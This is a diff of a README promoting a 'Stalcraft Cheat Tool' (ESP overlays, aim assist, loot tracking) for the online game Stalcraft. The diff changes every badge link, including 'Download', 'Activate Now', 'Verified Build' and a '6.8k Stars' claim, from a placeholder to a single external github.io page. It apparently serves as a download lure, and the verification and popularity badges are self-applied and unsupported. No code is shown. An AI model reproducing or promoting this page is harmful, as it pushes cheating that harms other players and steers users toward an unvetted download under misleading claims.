@@ -23,10 +23,10 @@ Unlike basic hacks, this tool is **modular and customizable**. Switch between Pv
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 6.8k Stars](https://img.shields.io/badge/GitHub-6.8k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
+[![⭐️ 6.8k Stars](https://img.shields.io/badge/GitHub-6.8k_Stars-green?logo=github\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
 
 ---
 
@@ -159,9 +159,9 @@ A: It reduces detection risk but is never fully undetectable.
 
 The **Stalcraft Cheat Tool** merges **ESP overlays, aim assist, and loot/mutant tracking** into one adaptive package. Whether fighting mutants in PvE or clashing with stalkers in PvP, it ensures better survival, accuracy, and loot efficiency.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://stalcraft-cheat-tool.github.io/.github/)
 
 ---
 
